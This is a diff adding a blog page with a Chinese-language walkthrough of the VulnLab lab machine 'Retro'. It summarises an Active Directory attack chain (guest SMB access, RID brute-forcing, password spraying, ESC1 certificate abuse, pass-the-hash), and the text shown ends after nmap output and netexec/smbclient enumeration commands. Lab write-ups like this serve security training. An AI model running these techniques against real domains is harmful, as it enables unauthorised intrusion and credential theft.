@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <!-- bing -->
+  <meta name="msvalidate.01" content="D6E6F0AB3EAD6BA4F5541EDCB8EEDCC5" />
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- clarity -->
+  <script type="text/javascript">
+      (function(c,l,a,r,i,t,y){
+          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      })(window, document, "clarity", "script", "ph6eztilds");
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;5e345532-aedf-47d3-b2fe-8d6f19af90a9 首先使用 nmap 掃描識別目標系統為 Active Directory 環境。隨後，通過 guest 用戶訪問 SMB 共享目錄，發現了名為 Trainees 的目錄可以讀取。利用 rid-brute 技術枚舉用戶帳戶後，發現了一個名為">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnLab - Machine - Retro">
+<meta property="og:url" content="https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;5e345532-aedf-47d3-b2fe-8d6f19af90a9 首先使用 nmap 掃描識別目標系統為 Active Directory 環境。隨後，通過 guest 用戶訪問 SMB 共享目錄，發現了名為 Trainees 的目錄可以讀取。利用 rid-brute 技術枚舉用戶帳戶後，發現了一個名為">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102072903-nod2jzo.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102063151-ncj5fuf.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102063448-nrrpjip.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250103011916-481001y.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102064719-6ovrjgc.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102065534-fwpuz3r.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102065617-sey8jqd.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250103012332-cyrx5yg.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102070235-whaehhl.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102070307-kdgl1h9.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102070413-tgg7qqg.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102070535-i2iicyr.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102071518-6yibc7g.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102072005-ml34iyu.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102072143-4jzpwwk.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102072211-wxr5qzm.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102072509-5vndelm.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102072607-zctop9h.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102072752-o7tmzqm.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102072826-2l77s0v.png">
+<meta property="article:published_time" content="2025-01-02T19:53:00.000Z">
+<meta property="article:modified_time" content="2025-01-02T19:54:38.065Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102072903-nod2jzo.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VulnLab - Machine - Retro</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/03/2025/08-vulnlab-manage/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/&text=VulnLab - Machine - Retro"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/&title=VulnLab - Machine - Retro"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/&is_video=false&description=VulnLab - Machine - Retro"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Retro&body=Check out this article: https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/&title=VulnLab - Machine - Retro"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/&title=VulnLab - Machine - Retro"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/&title=VulnLab - Machine - Retro"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/&title=VulnLab - Machine - Retro"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/&name=VulnLab - Machine - Retro&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/03/2025/09-vulnlab-retro/&t=VulnLab - Machine - Retro"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VulnLab - Machine - Retro
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-02T19:53:00.000Z" class="dt-published" itemprop="datePublished">2025-01-03</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>​<img src="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102072903-nod2jzo.png" alt="image">​</p>
+<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=5e345532-aedf-47d3-b2fe-8d6f19af90a9">https://api.vulnlab.com/api/v1/share?id=5e345532-aedf-47d3-b2fe-8d6f19af90a9</a></p>
+<p>首先使用 nmap 掃描識別目標系統為 Active Directory 環境。隨後，通過 guest 用戶訪問 SMB 共享目錄，發現了名為 Trainees 的目錄可以讀取。利用 rid-brute 技術枚舉用戶帳戶後，發現了一個名為 Important.txt 的文件，文件中透露了用戶密碼政策的線索。通過密碼噴射技術，成功獲得了 trainee 用戶的密碼，並進一步訪問了新增的 Notes 共享目錄。該目錄中包含有關舊版銀行軟件和計算機帳戶配置的提示，暗示需要從 LDAP 中查找屬性為 userAccountControl&#x3D;4128 的計算機帳戶。隨後，嘗試使用 Kerberos 驗證，因為 NTLM 驗證失敗，並發現了 Active Directory Certificate Services (ADCS)。請求了一個票據後，使用 certipy 工具查找可利用的證書。由於緩存服務器問題，certipy 無法找到正確的 DC IP，因此需要指定 -dc-ip 和 -target 屬性。最終，certipy 標記了可以利用的 ESC1 證書，並在設置 -key-size 4096 後成功請求到管理員證書。通過獲取的 NTLM hash，使用 pass-the-hash 攻擊成功獲得系統控制權。</p>
+<h1 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h1><p>首先先進行 nmap 掃描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-01-01 21:36:14Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC.retro.vl</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl</span><br><span class="line">| Issuer: commonName=retro-DC-CA/domainComponent=retro</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2025-01-01T21:09:58</span><br><span class="line">| Not valid after:  2026-01-01T21:09:58</span><br><span class="line">| MD5:   d43c:7222:b9dd:cb75:5015:fc51:5abc:e416</span><br><span class="line">| SHA-1: 1d65:6f2a:e10f:4295:2195:fc03:b511:d2cb:0278:d540</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=DC.retro.vl</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl</span><br><span class="line">| Issuer: commonName=retro-DC-CA/domainComponent=retro</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2025-01-01T21:09:58</span><br><span class="line">| Not valid after:  2026-01-01T21:09:58</span><br><span class="line">| MD5:   d43c:7222:b9dd:cb75:5015:fc51:5abc:e416</span><br><span class="line">| SHA-1: 1d65:6f2a:e10f:4295:2195:fc03:b511:d2cb:0278:d540</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=DC.retro.vl</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl</span><br><span class="line">| Issuer: commonName=retro-DC-CA/domainComponent=retro</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2025-01-01T21:09:58</span><br><span class="line">| Not valid after:  2026-01-01T21:09:58</span><br><span class="line">| MD5:   d43c:7222:b9dd:cb75:5015:fc51:5abc:e416</span><br><span class="line">| SHA-1: 1d65:6f2a:e10f:4295:2195:fc03:b511:d2cb:0278:d540</span><br><span class="line">3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-01-01T21:37:45+00:00; -2s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=DC.retro.vl</span><br><span class="line">| Issuer: commonName=DC.retro.vl</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2024-12-31T21:19:00</span><br><span class="line">| Not valid after:  2025-07-02T21:19:00</span><br><span class="line">| MD5:   efd4:49b0:9385:6469:261c:0d27:0e62:44c7</span><br><span class="line">| SHA-1: ec7b:d976:fcef:2d21:798d:4948:f508:fd19:b906:dafa</span><br><span class="line">| -----BEGIN CERTIFICATE-----</span><br><span class="line">| MIIC2jCCAcKgAwIBAgIQGfPXsJlfmq1KsMATec/bVDANBgkqhkiG9w0BAQsFADAW</span><br><span class="line">| MRQwEgYDVQQDEwtEQy5yZXRyby52bDAeFw0yNDEyMzEyMTE5MDBaFw0yNTA3MDIy</span><br><span class="line">| MTE5MDBaMBYxFDASBgNVBAMTC0RDLnJldHJvLnZsMIIBIjANBgkqhkiG9w0BAQEF</span><br><span class="line">| AAOCAQ8AMIIBCgKCAQEAr3WJxPA3APKF4Lf1wCwfdUDTbznhqHHjakBde0/43qIO</span><br><span class="line">| RpwVptxwz9uGVOzLRqefoNnvjnlAvDXoSACP9Qdd6zisjJWKeWk5N2Tvxe0KZY27</span><br><span class="line">| 2/uZ/Zzi/nlgYMLjg5roTo4Y9jasJUf8M27FsFNcdis2GnDhOiCv/aGkU/JhTAZ/</span><br><span class="line">| UbgyoutlQlA5nwkkHXALxZTOWqzVeSubO6seQsBs3FO74pkD4bDCJsWu4nJN8tea</span><br><span class="line">| URrUznbcEYHG52oSUWHN1DCN73PDOL01xsOkPhkyn0XNS7149kGEnnvxmZ45nnFd</span><br><span class="line">| slfko4Yzthc22emap7mu5VibhWzV10VWj7/yqVIIeQIDAQABoyQwIjATBgNVHSUE</span><br><span class="line">| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAJ8O</span><br><span class="line">| uXFAKmbAtxdA5bj7D5mb1Hlrcn/zmAvWEH8FqYq2mrdesK9du78yzQVJZQWn9T73</span><br><span class="line">| Ld0iEVICHTwANPHMIgYgLyLL5hQWUgLvaeM00MAD45qwXoArurxjdjA1HiWdFSBU</span><br><span class="line">| dHud2ferdAH4ra0hwKCsHRocQQh9ZhqOn+0GkjpT/gputXmCPxnkc6jnS9J0yxcD</span><br><span class="line">| ocdQm09BXVzCQth0/MyLDyLrYWL9PU2Q2cAZTNEEbKf6efw5hzxHY37co2I4ug4O</span><br><span class="line">| 2x54KWbeYGHACrGOvDuFD3n97xTJA7lXbBC7+ZuMgdrUCQpuAql94xPK2kL7W4zq</span><br><span class="line">| leW9HMJTZrpD5W1N7iE=</span><br><span class="line">|_-----END CERTIFICATE-----</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: RETRO</span><br><span class="line">|   NetBIOS_Domain_Name: RETRO</span><br><span class="line">|   NetBIOS_Computer_Name: DC</span><br><span class="line">|   DNS_Domain_Name: retro.vl</span><br><span class="line">|   DNS_Computer_Name: DC.retro.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-01-01T21:37:05+00:00</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49678/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49680/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49689/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49698/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49721/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49872/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time:</span><br><span class="line">|   <span class="built_in">date</span>: 2025-01-01T21:37:08</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: -2s, deviation: 0s, median: -3s</span><br><span class="line">| p2p-conficker:</span><br><span class="line">|   Checking <span class="keyword">for</span> Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 34396/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 2 (port 41401/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 3 (port 23947/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 51377/udp): CLEAN (Timeout)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="Enum-smb-share-folder"><a href="#Enum-smb-share-folder" class="headerlink" title="Enum smb share folder"></a>Enum smb share folder</h1><p>可以看得出這是個 AD， 使用 guest 看一下smb的共享目錄：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb  10.10.85.6 -u guest -p <span class="string">&#x27;&#x27;</span> --shares</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102063151-ncj5fuf.png" alt="image">​</p>
+<p>發現 <code>Trainees</code>​ 這個目錄有讀取的權限， <code>guest</code>​ 用戶可以不需要密碼來登錄，試一下 <code>rid-brute</code>​ ：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb  10.10.85.6 -u guest -p <span class="string">&#x27;&#x27;</span> --rid-brute 10000 </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250102063448-nrrpjip.png" alt="image">​</p>
+<p>得到了所有的用戶，由於 smb 上面有一些文件，所以打開看看：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient -U <span class="string">&quot;guest%&quot;</span> //10.10.85.6/Trainees</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/09-vulnlab-Retro/image-20250103011916-481001y.png" alt="image">​</p>
+<p>裏面有一個 <code>Important.txt</code>​：</p>
